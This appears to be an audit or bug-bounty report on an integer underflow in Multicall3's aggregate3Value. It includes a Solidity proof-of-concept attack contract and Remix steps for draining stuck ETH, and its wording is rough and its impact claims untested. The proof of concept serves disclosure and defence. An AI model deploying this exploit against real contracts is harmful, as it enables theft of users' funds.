# integer underflow

## Summary
in multicall.sol::aggregateV3value there is assumed that integer underflow will not be happened. However if allowfailure set true and use two call as first call with x value and other 2**256-x valaccumulator will be 0 (so msg.value will be zero but hacker can send x eth from contract) and transaction will be succeed. this can be used maliciously because anybody can be take staked token in contract for themselves. Moreover, other functions also payable and some of them dont send any value so there is highly chance to eth stake in contract (so there is high chance to attacker will steal staked eth).
## Vulnerability Detail
contract attack{
function hack(address x) external payable {
        Multicall3.Call3Value memory y;
        y.allowFailure=true;
        y.target=0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
        y.value=1e18;
        y.callData="";
        Multicall3.Call3Value memory z;
        z.allowFailure=true;
        z.target=msg.sender;
        z.value=2**256-1e18;
        z.callData="";
        Multicall3.Call3Value[] memory calls=new  Multicall3.Call3Value[](2);
        calls[0]=y;
        calls[1]=z;
        Multicall3(x).aggregate3Value(calls);
    }
}
pls first copy&paste multicall3.sol and after copy paste this contract in remix after that stuck 1 ether to multicall with any function (for example, use aggreagate with 1 ether with empty tuple). After that use attack::hack function it will show that transaction succeed and attecker will take this 1 ether.
## Impact
aggregateV3value can be underflow and malicious users can use it for steal staked eth.

## Recommendation
using valaccumulator without uncheck.
